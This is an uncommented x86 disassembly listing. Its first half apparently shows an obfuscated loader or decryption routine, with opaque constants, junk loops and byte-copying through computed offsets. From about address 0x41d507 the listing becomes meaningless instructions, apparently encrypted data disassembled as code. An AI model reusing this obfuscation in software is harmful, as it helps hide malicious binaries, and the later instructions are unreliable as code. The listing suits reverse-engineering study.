  41cebc:	cmp    al,BYTE PTR ds:0x426a6b
  41cec2:	jne    0x41c211
  41cec8:	push   0x426a75
  41cecd:	push   0x426a85
  41ced2:	call   edi
  41ced4:	test   eax,eax
  41ced6:	je     0x41c211
  41cedc:	mov    al,ds:0x426a9b
  41cee1:	cmp    al,BYTE PTR ds:0x426aa6
  41cee7:	jne    0x41c211
  41ceed:	mov    al,ds:0x426ab8
  41cef2:	cmp    al,BYTE PTR ds:0x426ac7
  41cef8:	jne    0x41c211
  41cefe:	push   0x426ad1
  41cf03:	push   0x426ae1
  41cf08:	call   edi
  41cf0a:	test   eax,eax
  41cf0c:	je     0x41c211
  41cf12:	mov    al,ds:0x426af7
  41cf17:	cmp    al,BYTE PTR ds:0x426b02
  41cf1d:	jne    0x41c211
  41cf23:	mov    al,ds:0x426b14
  41cf28:	cmp    al,BYTE PTR ds:0x426b23
  41cf2e:	jne    0x41c211
  41cf34:	push   0x426b2d
  41cf39:	push   0x426b3d
  41cf3e:	call   edi
  41cf40:	test   eax,eax
  41cf42:	je     0x41c211
  41cf48:	mov    al,ds:0x426b53
  41cf4d:	cmp    al,BYTE PTR ds:0x426b5e
  41cf53:	jne    0x41c211
  41cf59:	mov    al,ds:0x426b70
  41cf5e:	cmp    al,BYTE PTR ds:0x426b7f
  41cf64:	jne    0x41c211
  41cf6a:	push   0x426b89
  41cf6f:	push   0x426b99
  41cf74:	call   edi
  41cf76:	test   eax,eax
  41cf78:	je     0x41c211
  41cf7e:	mov    al,ds:0x426baf
  41cf83:	cmp    al,BYTE PTR ds:0x426bba
  41cf89:	jne    0x41c211
  41cf8f:	mov    al,ds:0x426bcc
  41cf94:	cmp    al,BYTE PTR ds:0x426bdb
  41cf9a:	jne    0x41c211
  41cfa0:	push   0x426be5
  41cfa5:	push   0x426bf5
  41cfaa:	call   edi
  41cfac:	test   eax,eax
  41cfae:	je     0x41c211
  41cfb4:	mov    al,ds:0x426c0b
  41cfb9:	cmp    al,BYTE PTR ds:0x426c16
  41cfbf:	jne    0x41c211
  41cfc5:	mov    al,ds:0x426c28
  41cfca:	cmp    al,BYTE PTR ds:0x426c37
  41cfd0:	jne    0x41c211
  41cfd6:	push   0x426c41
  41cfdb:	push   0x426c51
  41cfe0:	call   edi
  41cfe2:	test   eax,eax
  41cfe4:	je     0x41c211
  41cfea:	mov    al,ds:0x426c67
  41cfef:	cmp    al,BYTE PTR ds:0x426c72
  41cff5:	jne    0x41c211
  41cffb:	mov    al,ds:0x426c84
  41d000:	cmp    al,BYTE PTR ds:0x426c93
  41d006:	jne    0x41c211
  41d00c:	push   0x426c9d
  41d011:	push   0x426cad
  41d016:	call   edi
  41d018:	test   eax,eax
  41d01a:	je     0x41c211
  41d020:	mov    eax,DWORD PTR [esp+0x34]
  41d024:	cmp    eax,0xf89c85b4
  41d029:	je     0x41d088
  41d02f:	mov    eax,DWORD PTR [esp+0x10]
  41d033:	mov    ecx,DWORD PTR [esp+0x30]
  41d037:	xor    eax,esi
  41d039:	add    eax,ebx
  41d03b:	cmp    eax,ecx
  41d03d:	je     0x41d088
  41d043:	mov    eax,ds:0x4262c9
  41d048:	mov    eax,DWORD PTR [eax+0x194]
  41d04e:	mov    ecx,DWORD PTR [eax]
  41d050:	mov    eax,DWORD PTR [ecx+0x3c]
  41d053:	push   DWORD PTR ds:0x4263a9
  41d059:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41d05d:	push   DWORD PTR ds:0x42614d
  41d063:	add    eax,ecx
  41d065:	mov    ecx,DWORD PTR ds:0x4262c9
  41d06b:	mov    ecx,DWORD PTR [ecx+0x194]
  41d071:	push   DWORD PTR [ecx]
  41d073:	call   eax
  41d075:	mov    ecx,DWORD PTR ds:0x4262c9
  41d07b:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d081:	mov    DWORD PTR [ecx],eax
  41d083:	jmp    0x41d259
  41d088:	mov    eax,DWORD PTR [esp+0x10]
  41d08c:	mov    ecx,DWORD PTR [esp+0x48]
  41d090:	xor    eax,esi
  41d092:	add    eax,ebx
  41d094:	cmp    eax,ecx
  41d096:	jne    0x41d101
  41d09c:	mov    eax,DWORD PTR [esp+0x10]
  41d0a0:	mov    ecx,DWORD PTR ds:0x4262c9
  41d0a6:	mov    ecx,DWORD PTR [ecx+0x198]
  41d0ac:	xor    eax,esi
  41d0ae:	add    eax,ebx
  41d0b0:	cmp    eax,DWORD PTR [ecx]
  41d0b2:	jne    0x41d0da
  41d0b8:	mov    eax,DWORD PTR [esp+0x10]
  41d0bc:	push   0xffffffff
  41d0be:	push   0x70941f8a
  41d0c3:	xor    eax,esi
  41d0c5:	add    eax,ebx
  41d0c7:	push   eax
  41d0c8:	push   0xf89c85b9
  41d0cd:	push   DWORD PTR [esp+0x2c]
  41d0d1:	push   DWORD PTR [esp+0x24]
  41d0d5:	call   0x417355
  41d0da:	push   DWORD PTR [esp+0x1c]
  41d0de:	push   DWORD PTR [esp+0x14]
  41d0e2:	call   0x401000
  41d0e7:	mov    eax,DWORD PTR [esp+0x10]
  41d0eb:	xor    eax,esi
  41d0ed:	add    eax,ebx
  41d0ef:	mov    ds:0x426355,eax
  41d0f4:	mov    eax,DWORD PTR [esp+0x10]
  41d0f8:	xor    eax,esi
  41d0fa:	add    eax,ebx
  41d0fc:	mov    ds:0x42634d,eax
  41d101:	mov    eax,DWORD PTR [esp+0x20]
  41d105:	test   eax,eax
  41d107:	je     0x41d259
  41d10d:	mov    DWORD PTR [esp+0x50],0xf152c3c
  41d115:	mov    DWORD PTR [esp+0x54],0x712edcf
  41d11d:	mov    DWORD PTR [esp+0x58],0x373fc2d
  41d125:	mov    DWORD PTR [esp+0x5c],0x72670add
  41d12d:	call   0x416fa9
  41d132:	mov    eax,DWORD PTR [esp+0x24]
  41d136:	mov    eax,DWORD PTR [esp+0x1c]
  41d13a:	mov    DWORD PTR [esp+0x44],eax
  41d13e:	mov    eax,DWORD PTR [esp+0x10]
  41d142:	mov    DWORD PTR [esp+0x1c],eax
  41d146:	mov    eax,eax
  41d148:	mov    eax,ds:0x4262c9
  41d14d:	mov    ecx,DWORD PTR [eax+0x1c0]
  41d153:	mov    edx,DWORD PTR [ecx]
  41d155:	and    DWORD PTR [esp+0x3c],0x0
  41d15a:	mov    edi,0xfabdbecd
  41d15f:	add    edx,edi
  41d161:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d166:	mov    ecx,0x8a29a147
  41d16b:	xor    edx,ecx
  41d16d:	mov    DWORD PTR [esp+0x28],edx
  41d171:	mov    edx,DWORD PTR [esp+0x3c]
  41d175:	xor    edx,0x0
  41d178:	cmp    DWORD PTR [esp+0x28],0x70941f89
  41d180:	mov    DWORD PTR [esp+0x2c],edx
  41d184:	jne    0x41d193
  41d18a:	cmp    edx,0xffffffff
  41d18d:	je     0x41d1fc
  41d193:	mov    eax,DWORD PTR [eax+0x1c8]
  41d199:	mov    eax,DWORD PTR [eax]
  41d19b:	cdq    
  41d19c:	add    eax,edi
  41d19e:	adc    edx,0xffffffff
  41d1a1:	and    DWORD PTR [esp+0x3c],0x0
  41d1a6:	xor    edx,0x0
  41d1a9:	mov    DWORD PTR [esp+0x14],edx
  41d1ad:	mov    edx,DWORD PTR [esp+0x1c]
  41d1b1:	mov    DWORD PTR [esp+0x38],edx
  41d1b5:	xor    eax,ecx
  41d1b7:	add    DWORD PTR [esp+0x38],edi
  41d1bb:	mov    edx,DWORD PTR [esp+0x38]
  41d1bf:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d1c4:	xor    edx,ecx
  41d1c6:	mov    DWORD PTR [esp+0x28],edx
  41d1ca:	mov    edx,DWORD PTR [esp+0x3c]
  41d1ce:	xor    edx,0x0
  41d1d1:	mov    DWORD PTR [esp+0x2c],edx
  41d1d5:	cmp    DWORD PTR [esp+0x28],eax
  41d1d9:	jne    0x41d1eb
  41d1df:	mov    eax,DWORD PTR [esp+0x14]
  41d1e3:	cmp    edx,eax
  41d1e5:	je     0x41d1fc
  41d1eb:	mov    eax,DWORD PTR [esp+0x1c]
  41d1ef:	add    eax,DWORD PTR [esp+0x44]
  41d1f3:	mov    DWORD PTR [esp+0x1c],eax
  41d1f7:	jmp    0x41d259
  41d1fc:	mov    eax,ds:0x42634d
  41d201:	mov    edx,DWORD PTR ds:0x426355
  41d207:	xor    eax,edx
  41d209:	mov    ds:0x42634d,eax
  41d20e:	mov    edx,DWORD PTR ds:0x42634d
  41d214:	mov    eax,DWORD PTR [esp+0x20]
  41d218:	add    DWORD PTR [eax],edx
  41d21a:	mov    edx,DWORD PTR [esp+0x1c]
  41d21e:	mov    eax,ds:0x42634d
  41d223:	xor    edx,esi
  41d225:	add    edx,ebx
  41d227:	xor    ebx,ebx
  41d229:	add    edx,edi
  41d22b:	adc    ebx,0xffffffff
  41d22e:	xor    esi,esi
  41d230:	xor    edx,ecx
  41d232:	xor    ebx,0x0
  41d235:	add    eax,edi
  41d237:	adc    esi,0xffffffff
  41d23a:	xor    eax,ecx
  41d23c:	xor    esi,0x0
  41d23f:	cmp    eax,edx
  41d241:	jne    0x41d259
  41d247:	cmp    esi,ebx
  41d249:	jne    0x41d259
  41d24f:	mov    eax,ds:0x42634d
  41d254:	mov    ds:0x426355,eax
  41d259:	mov    eax,ds:0x4262c9
  41d25e:	push   0x4
  41d260:	add    eax,0x1cc
  41d265:	push   eax
  41d266:	lea    eax,[esp+0x2c]
  41d26a:	push   eax
  41d26b:	call   0x41d27f
  41d270:	mov    eax,DWORD PTR [esp+0x24]
  41d274:	mov    eax,DWORD PTR [eax]
  41d276:	pop    edi
  41d277:	pop    esi
  41d278:	pop    ebx
  41d279:	mov    esp,ebp
  41d27b:	pop    ebp
  41d27c:	ret    0xc
  41d27f:	push   ebp
  41d280:	mov    ebp,esp
  41d282:	sub    esp,0x10
  41d285:	mov    eax,ds:0x427c91
  41d28a:	mov    ecx,DWORD PTR ds:0x429d55
  41d290:	sub    eax,ecx
  41d292:	add    eax,DWORD PTR [eax+ecx*1]
  41d295:	mov    eax,0xf89c85b5
  41d29a:	and    DWORD PTR ds:0x426eb9,ecx
  41d2a0:	mov    DWORD PTR [ebp-0x4],eax
  41d2a3:	and    DWORD PTR ds:0x426f29,0x0
  41d2ad:	mov    edx,DWORD PTR ds:0x426f29
  41d2b3:	inc    edx
  41d2b4:	mov    DWORD PTR ds:0x426f29,edx
  41d2ba:	cmp    DWORD PTR ds:0x426f29,0xc
  41d2c1:	jge    0x41d300
  41d2c7:	jmp    0x41d2d7
  41d2cc:	push   0x4f6e
  41d2d1:	call   DWORD PTR ds:0x430a2c
  41d2d7:	cmp    DWORD PTR ds:0x426f29,0xb
  41d2de:	jne    0x41d2f3
  41d2e4:	xor    edx,edx
  41d2e6:	add    edx,DWORD PTR ds:0x426f29
  41d2ec:	inc    edx
  41d2ed:	mov    DWORD PTR ds:0x426f29,edx
  41d2f3:	cmp    DWORD PTR ds:0x426f29,0x14
  41d2fa:	jb     0x41d2ad
  41d300:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  41d307:	mov    edx,DWORD PTR ds:0x426ee9
  41d30d:	sbb    DWORD PTR ds:0x426f21,edx
  41d313:	mov    ecx,DWORD PTR [ebp-0x4]
  41d316:	mov    DWORD PTR ds:0x426ebd,0x1b
  41d320:	cmp    DWORD PTR ds:0x426ebd,0x0
  41d327:	je     0x41d371
  41d32d:	cmp    DWORD PTR ds:0x426ebd,0x2
  41d334:	jg     0x41d371
  41d33a:	jmp    0x41d345
  41d33f:	call   DWORD PTR ds:0x430a38
  41d345:	cmp    DWORD PTR ds:0x426ebd,0x3
  41d34c:	jne    0x41d35f
  41d352:	mov    edx,DWORD PTR ds:0x426ebd
  41d358:	dec    edx
  41d359:	mov    DWORD PTR ds:0x426ebd,edx
  41d35f:	mov    edx,DWORD PTR ds:0x426ebd
  41d365:	dec    edx
  41d366:	mov    DWORD PTR ds:0x426ebd,edx
  41d36c:	jmp    0x41d320
  41d371:	push   esi
  41d372:	or     edx,0x1404
  41d378:	mov    edx,0x75108b3
  41d37d:	mov    esi,DWORD PTR ds:0x426eb5
  41d383:	and    DWORD PTR ds:0x426e95,esi
  41d389:	xor    ecx,edx
  41d38b:	xor    esi,DWORD PTR ds:0x426eb9
  41d391:	mov    esi,0x3272fa
  41d396:	push   edi
  41d397:	xor    DWORD PTR ds:0x426ec5,0xe12
  41d3a1:	mov    edi,DWORD PTR [ebp+0x10]
  41d3a4:	add    ecx,esi
  41d3a6:	mov    DWORD PTR ds:0x426f09,0x182c
  41d3b0:	cmp    ecx,edi
  41d3b2:	je     0x41d4a2
  41d3b8:	mov    ecx,DWORD PTR [ebp-0x4]
  41d3bb:	movzx  edi,WORD PTR ds:0x426f09
  41d3c2:	add    DWORD PTR ds:0x426ea5,edi
  41d3c8:	mov    edi,DWORD PTR [ebp+0x10]
  41d3cb:	xor    eax,eax
  41d3cd:	xor    ecx,edx
  41d3cf:	add    ecx,esi
  41d3d1:	add    DWORD PTR ds:0x426ed1,0x330a
  41d3db:	add    edi,0xfabdbecd
  41d3e1:	mov    DWORD PTR ds:0x426ee5,0x5f33
  41d3eb:	adc    eax,0xffffffff
  41d3ee:	and    DWORD PTR ds:0x426ecd,0x4eeb
  41d3f8:	xor    eax,0x0
  41d3fb:	mov    DWORD PTR [ebp-0xc],eax
  41d3fe:	push   ebx
  41d3ff:	xor    ebx,ebx
  41d401:	xor    edi,0x8a29a147
  41d407:	mov    eax,ecx
  41d409:	add    eax,0xfabdbecd
  41d40e:	adc    ebx,0xffffffff
  41d411:	xor    eax,0x8a29a147
  41d416:	xor    ebx,0x0
  41d419:	cmp    eax,edi
  41d41b:	jne    0x41d434
  41d421:	cmp    ebx,DWORD PTR [ebp-0xc]
  41d424:	je     0x41d49c
  41d42a:	jmp    0x41d434
  41d42f:	mov    esi,0x3272fa
  41d434:	mov    eax,DWORD PTR [ebp-0x4]
  41d437:	mov    edi,DWORD PTR [ebp-0x8]
  41d43a:	xor    edi,edx
  41d43c:	add    edi,esi
  41d43e:	mov    esi,DWORD PTR [ebp+0x8]
  41d441:	imul   edi,ecx
  41d444:	mov    ebx,DWORD PTR [ebp+0xc]
  41d447:	xor    eax,edx
  41d449:	add    eax,ecx
  41d44b:	mov    al,BYTE PTR [ebx+eax*1+0x3272fa]
  41d452:	mov    BYTE PTR [edi+esi*1],al
  41d455:	mov    eax,DWORD PTR [ebp-0x8]
  41d458:	mov    esi,DWORD PTR [ebp+0x10]
  41d45b:	xor    eax,edx
  41d45d:	xor    ebx,ebx
  41d45f:	add    esi,0xfabdbecd
  41d465:	adc    ebx,0xffffffff
  41d468:	lea    ecx,[ecx+eax*1+0x3272fa]
  41d46f:	xor    edi,edi
  41d471:	xor    esi,0x8a29a147
  41d477:	xor    ebx,0x0
  41d47a:	mov    eax,ecx
  41d47c:	add    eax,0xfabdbecd
  41d481:	adc    edi,0xffffffff
  41d484:	xor    eax,0x8a29a147
  41d489:	xor    edi,0x0
  41d48c:	cmp    eax,esi
  41d48e:	jne    0x41d42f
  41d494:	cmp    edi,ebx
  41d496:	jne    0x41d42f
  41d49c:	mov    eax,0xf89c85b4
  41d4a1:	pop    ebx
  41d4a2:	pop    edi
  41d4a3:	pop    esi
  41d4a4:	leave  
  41d4a5:	ret    0xc
  41d4a8:	push   ebp
  41d4a9:	mov    ebp,esp
  41d4ab:	push   ecx
  41d4ac:	and    DWORD PTR ds:0x426e8d,0x0
  41d4b6:	mov    eax,ds:0x426e8d
  41d4bb:	inc    eax
  41d4bc:	mov    ds:0x426e8d,eax
  41d4c1:	cmp    DWORD PTR ds:0x426e8d,0x1c
  41d4c8:	jge    0x41d4eb
  41d4ce:	jmp    0x41d4de
  41d4d3:	push   0x5eb6
  41d4d8:	call   DWORD PTR ds:0x430a3c
  41d4de:	cmp    DWORD PTR ds:0x426e8d,0x1a
  41d4e5:	jb     0x41d4b6
  41d4eb:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41d4f2:	neg    DWORD PTR ds:0x426e9d
  41d4f8:	mov    eax,DWORD PTR [ebp+0x8]
  41d4fb:	or     ecx,edx
  41d4fd:	movsx  eax,BYTE PTR [eax]
  41d500:	sub    ecx,ecx
  41d502:	jmp    0x41f875
  41d507:	ret    0x203
  41d50a:	add    BYTE PTR [edx-0x7e],0x42
  41d50e:	inc    ebx
  41d50f:	cmc    
  41d510:	in     al,0x42
  41d512:	sub    BYTE PTR [ecx],dl
  41d514:	pop    edx
  41d515:	or     BYTE PTR [edx],dh
  41d517:	(bad)  
  41d518:	(bad)  
  41d519:	jp     0x41d596
  41d51b:	rcr    DWORD PTR [ebx+edi*2+0x21d7027b],1
  41d522:	lods   eax,DWORD PTR ds:[esi]
  41d523:	ins    BYTE PTR es:[edi],dx
  41d524:	lahf   
  41d525:	cdq    
  41d526:	test   DWORD PTR [esi+0x72aec40f],edx
  41d52c:	data16 mov al,ds:0x323d9e7a
  41d532:	and    ebp,DWORD PTR [eax-0x25]
  41d535:	sbb    BYTE PTR [ebx],cl
  41d537:	or     al,0x3d
  41d539:	xor    DWORD PTR [esi+0x7ac38ad5],eax
  41d53f:	ins    BYTE PTR es:[edi],dx
  41d540:	and    al,0xc8
  41d542:	sbb    al,0xa3
  41d544:	test   eax,0xa7428737
  41d549:	cld    
  41d54a:	scas   al,BYTE PTR es:[edi]
  41d54b:	sbb    BYTE PTR ds:0xea8d3e36,al
  41d552:	aad    0x1
  41d554:	mov    edi,0x60c41cff
  41d559:	sub    al,0x13
  41d55b:	xchg   esi,eax
  41d55c:	xchg   ecx,eax
  41d55d:	adc    edi,DWORD PTR [edx-0x65]
  41d560:	dec    ecx
  41d561:	cmp    eax,0x9aa2840c
  41d566:	add    DWORD PTR [edi],esp
  41d568:	jno    0x41d5d7
  41d56a:	jle    0x41d524
  41d56c:	dec    esp
  41d56d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d56e:	and    esp,0x784184b5
  41d574:	add    al,0x5f
  41d576:	test   BYTE PTR [eax],dh
  41d578:	ja     0x41d53e
  41d57a:	jg     0x41d51f
  41d57c:	fdivr  QWORD PTR [esi]
  41d57e:	push   0xffffffc4
  41d580:	xchg   dl,bh
  41d582:	inc    ecx
  41d583:	fisubr DWORD PTR [ebx+0x11]
  41d586:	aam    0x33
  41d588:	rol    DWORD PTR [esi],0x5d
  41d58b:	xor    DWORD PTR [eax-0x20],0xfbac8bba
  41d592:	loope  0x41d563
  41d594:	fs xor dh,0x58
  41d598:	inc    ebp
  41d599:	test   eax,0xb621479a
  41d59e:	dec    edi
  41d59f:	xor    BYTE PTR [esi-0x7f4771ad],bh
  41d5a5:	or     DWORD PTR [edx],edx
  41d5a7:	add    ecx,DWORD PTR [eax]
  41d5a9:	xchg   ecx,eax
  41d5aa:	dec    eax
  41d5ab:	imul   esp,DWORD PTR [ebp+ecx*4+0x40660e3c],0x37bbf014
  41d5b6:	in     eax,dx
  41d5b7:	mov    edi,0xfa7c567d
  41d5bc:	fimul  WORD PTR [edi-0x39]
  41d5bf:	loopne 0x41d5cb
  41d5c1:	sbb    eax,esi
  41d5c3:	push   edx
  41d5c4:	mov    BYTE PTR [eax+esi*2+0x1148c3ed],ah
  41d5cb:	push   esp
  41d5cc:	lds    eax,FWORD PTR [eax-0x7372a90d]
  41d5d2:	es out 0x3d,al
  41d5d5:	cmc    
  41d5d6:	aad    0x4e
  41d5d8:	inc    ebx
  41d5d9:	jecxz  0x41d5ce
  41d5db:	mov    DWORD PTR [esi-0x65e3f34],edx
  41d5e1:	push   esp
  41d5e2:	cwde   
  41d5e3:	jle    0x41d63e
  41d5e5:	sub    DWORD PTR [edx+0x304487ac],ecx
  41d5eb:	ss mov ebx,0x24e96a55
  41d5f1:	xor    eax,0xb52dc6c0
  41d5f6:	not    dh
  41d5f8:	inc    edi
  41d5f9:	fldenv [edx+0x65fea94e]
  41d5ff:	fidivr WORD PTR [ebx]
  41d601:	or     al,0xf5
  41d603:	imul   eax,edx,0x90345f09
  41d609:	ror    BYTE PTR [ebx],0xba
  41d60c:	cmp    eax,0xe3e495e4
  41d611:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d612:	imul   ecx,DWORD PTR ds:0xb41e4951,0x48
  41d619:	iret   
  41d61a:	pop    esi
  41d61b:	aam    0x85
  41d61d:	or     al,0x51
  41d61f:	mov    eax,0xc380ddb3
  41d624:	repz add esi,DWORD PTR [ebx+0x3e5418cc]
  41d62b:	pop    ebp
  41d62c:	inc    ecx
  41d62d:	inc    esp
  41d62e:	fisub  DWORD PTR [ecx-0x32]
  41d631:	int3   
  41d632:	sub    cl,BYTE PTR [ebx+0x25]
  41d635:	push   0xe7a009e8
  41d63a:	xor    eax,0xe58e218
  41d63f:	es int 0x3
  41d642:	cwde   
  41d643:	adc    dh,BYTE PTR [ecx-0x10ef5adf]
  41d649:	sbb    ecx,esp
  41d64b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d64c:	imul   esi,ecx,0xffffffe3
  41d64f:	out    0xa,al
  41d651:	jno    0x41d655
  41d653:	dec    ecx
  41d654:	inc    edi
  41d655:	lods   eax,DWORD PTR ds:[esi]
  41d656:	into   
  41d657:	mov    esp,esi
  41d659:	jno    0x41d5ec
  41d65b:	fdivr  st(1),st
  41d65d:	mov    ebx,0x41ca6baa
  41d662:	adc    BYTE PTR [edi],ah
  41d664:	xchg   edx,eax
  41d665:	mov    edi,0x2f3f6f5d
  41d66a:	fsub   QWORD PTR [edi+edx*2+0x4e9033cf]
  41d671:	icebp  
  41d672:	(bad)  
  41d673:	push   ss
  41d674:	(bad)  
  41d675:	add    BYTE PTR fs:[bp+di+0x412c],cl
  41d67b:	pop    esp
  41d67c:	cmp    BYTE PTR [eax],cl
  41d67e:	pop    ss
  41d67f:	cwde   
  41d680:	fidiv  DWORD PTR [ebx-0x8]
  41d683:	loop   0x41d677
  41d685:	ret    
  41d686:	ds dec edi
  41d688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d689:	jp     0x41d6ab
  41d68b:	cmp    BYTE PTR [ecx+0x68],bl
  41d68e:	es sahf 
  41d690:	dec    esi
  41d691:	push   edi
  41d692:	(bad)  
  41d693:	fcomp  QWORD PTR [edi-0x78bcf146]
  41d699:	ficom  WORD PTR [eax-0x10]
  41d69c:	pop    edx
  41d69d:	sbb    BYTE PTR [esi+ecx*1-0x1c],bl
  41d6a1:	sub    BYTE PTR [ecx+0x7c],dl
  41d6a4:	or     BYTE PTR ds:0x543a34c6,bl
  41d6aa:	dec    ecx
  41d6ab:	sbb    DWORD PTR [esi-0x5c3fdcac],ecx
  41d6b1:	cwde   
  41d6b2:	popa   
  41d6b3:	add    esp,DWORD PTR [edx-0x30f84eb8]
  41d6b9:	js     0x41d733
  41d6bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6bc:	jp     0x41d646
  41d6be:	js     0x41d6b4
  41d6c0:	push   0x2b1dee92
  41d6c5:	sahf   
  41d6c6:	adc    eax,0x86c0382
  41d6cb:	sub    esp,ebx
  41d6cd:	mov    bl,0x5c
  41d6cf:	out    dx,al
  41d6d0:	pushf  
  41d6d1:	fsub   st(7),st
  41d6d3:	fld    QWORD PTR [ebp+0x5796dad4]
  41d6d9:	shl    BYTE PTR [edi+0x2d],1
  41d6dc:	xlat   BYTE PTR ds:[ebx]
  41d6dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6de:	test   BYTE PTR [edi],ah
  41d6e0:	cli    
  41d6e1:	mov    ss,WORD PTR [ebp-0x2b]
  41d6e4:	mov    esi,esp
  41d6e6:	shl    DWORD PTR ds:0x63293cfd,1
  41d6ec:	sub    ah,0xb4
  41d6ef:	pop    ebp
  41d6f0:	repnz fisub DWORD PTR [edi-0x4338948e]
  41d6f7:	js     0x41d713
  41d6f9:	fsub   QWORD PTR [ebp+0x405f310f]
  41d6ff:	inc    esi
  41d700:	fcmovnu st,st(2)
  41d702:	in     al,dx
  41d703:	mov    ecx,0x4ada787f
  41d708:	ds cli 
  41d70a:	push   ecx
  41d70b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d70c:	push   es
  41d70d:	mov    ebp,0x4b98e89b
  41d712:	pop    eax
  41d713:	fild   QWORD PTR [esi+0x39]
  41d716:	popa   
  41d717:	pushf  
  41d718:	imul   ecx,DWORD PTR [esi+0xd97d0bd],0x2c
  41d71f:	or     dl,BYTE PTR [ebx+0x36]
  41d722:	(bad)  
  41d723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d724:	sbb    bh,al
  41d726:	push   ds
  41d727:	push   edx
  41d728:	outs   dx,DWORD PTR ds:[esi]
  41d729:	pop    ss
  41d72a:	clc    
  41d72b:	push   ebx
  41d72c:	hlt    
  41d72d:	int    0xca
  41d72f:	and    DWORD PTR [edx],esp
  41d731:	in     al,dx
  41d732:	les    esp,FWORD PTR [ebp-0x72]
  41d735:	sub    BYTE PTR [esi],dh
  41d737:	mov    eax,0x1d42a6e3
  41d73c:	iret   
  41d73d:	adc    eax,0x677dbcf7
  41d742:	in     al,dx
  41d743:	mov    ecx,0x901d6056
  41d748:	jnp    0x41d79a
  41d74a:	(bad)  
  41d74b:	jo     0x41d6d6
  41d74d:	(bad)  
  41d74f:	out    dx,eax
  41d750:	jb     0x41d76f
  41d752:	cmc    
  41d753:	cwde   
  41d754:	mov    ecx,DWORD PTR [edx]
  41d756:	dec    ecx
  41d757:	cli    
  41d758:	cmp    al,0xbc
  41d75a:	ror    edi,cl
  41d75c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d75d:	scas   eax,DWORD PTR es:[edi]
  41d75e:	or     al,0x1
  41d760:	or     eax,0x9f4fe4ff
  41d765:	jmp    0x4b89:0xb926b5f0
  41d76c:	shl    dh,cl
  41d76e:	inc    ecx
  41d76f:	inc    esp
  41d770:	(bad)  
  41d771:	out    dx,al
  41d772:	nop
  41d773:	stos   DWORD PTR es:[edi],eax
  41d774:	rcl    DWORD PTR [ecx],0xaf
  41d777:	aaa    
  41d778:	(bad)
  41d77b:	xor    DWORD PTR [edi-0x78c2c948],eax
  41d781:	jge    0x41d714
  41d783:	mov    bh,0x7e
  41d785:	sub    BYTE PTR [edx+ebp*1],0x2f
  41d789:	arpl   WORD PTR ds:0xa588330c,si
  41d78f:	adc    edi,DWORD PTR [eax]
  41d791:	cdq    
  41d792:	pop    ds
  41d793:	xchg   DWORD PTR [ebx+0x7],esi
  41d796:	xor    DWORD PTR [esp+ecx*2],ebp
  41d799:	mov    al,0x4c
  41d79b:	pop    ebx
  41d79c:	addr16 mov dh,0x88
  41d79f:	(bad)  
  41d7a0:	lahf   
  41d7a1:	test   BYTE PTR [esi],cl
  41d7a3:	lods   eax,DWORD PTR ds:[esi]
  41d7a4:	and    ah,BYTE PTR [ecx-0x3c6598fb]
  41d7aa:	pop    ebx
  41d7ab:	adc    al,BYTE PTR [ecx+0x635de4e0]
  41d7b1:	out    0x6f,al
  41d7b3:	cmp    al,0xd5
  41d7b5:	adc    ebp,esi
  41d7b7:	xor    ah,BYTE PTR [ecx+0x15]
  41d7ba:	or     edx,DWORD PTR [ecx-0x5b]
  41d7bd:	sub    DWORD PTR [eax-0x30fc91e8],0x309e2789
  41d7c7:	cmp    al,0x6e
  41d7c9:	mul    BYTE PTR [bp+si+0x38fc]
  41d7ce:	sub    edx,DWORD PTR [esi+0x57]
  41d7d1:	fdivr  DWORD PTR [esi+0x23]
  41d7d4:	in     eax,0xf
  41d7d6:	xchg   BYTE PTR [esi-0x20],ah
  41d7d9:	mov    bh,0xe
  41d7db:	jae    0x41d7b5
  41d7dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7de:	test   al,0xab
  41d7e0:	and    BYTE PTR [esi],bh
  41d7e2:	shr    DWORD PTR [ebp-0x62642537],cl
  41d7e8:	rcr    BYTE PTR [edi-0x3e],0xd
  41d7ec:	clc    
  41d7ed:	out    dx,eax
  41d7ee:	into   
  41d7ef:	iret   
  41d7f0:	mov    esp,0x593bd945
  41d7f5:	aaa    
  41d7f6:	js     0x41d820
  41d7f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7f9:	push   edx
  41d7fa:	repz lock push 0xffffffe1
  41d7fe:	gs push 0x4ef2ddfc
  41d804:	out    dx,eax
  41d805:	leave  
  41d806:	ror    DWORD PTR [edx+0x4079e6e3],cl
  41d80c:	mov    BYTE PTR [edx],dh
  41d80e:	jmp    0x6e95:0x24561d4e
  41d815:	dec    BYTE PTR [edi*1-0x3269c774]
  41d81c:	fwait
  41d81d:	pmaxub mm4,QWORD PTR [edx+0x3a3a026b]
  41d824:	rcr    esp,cl
  41d826:	pop    esi
  41d827:	cmc    
  41d828:	jg     0x41d80f
  41d82a:	jne    0x41d85e
  41d82c:	xchg   dl,cl
  41d82e:	clc    
  41d82f:	mov    ebp,0x372a06cb
  41d834:	cld    
  41d835:	hlt    
  41d836:	ret    0x34c2
  41d839:	xchg   esp,eax
  41d83a:	mov    bh,0xc0
  41d83c:	int3   
  41d83d:	test   bl,dl
  41d83f:	sub    BYTE PTR ds:0xbb7be5e,ah
  41d845:	and    eax,0xfe124734
  41d84a:	imul   esi,esp,0xffffff89
  41d84d:	imul   edi,DWORD PTR [esi-0x6d],0x33
  41d851:	push   0x3d7fcb7d
  41d856:	retf   0xa06a
  41d859:	popa   
  41d85a:	add    ebp,DWORD PTR [edx+0x3b]
  41d85d:	mov    ecx,DWORD PTR [ebx+edx*2]
  41d860:	mov    ebx,0x861989c
  41d865:	loopne 0x41d8ab
  41d867:	aas    
  41d868:	xor    al,0xdf
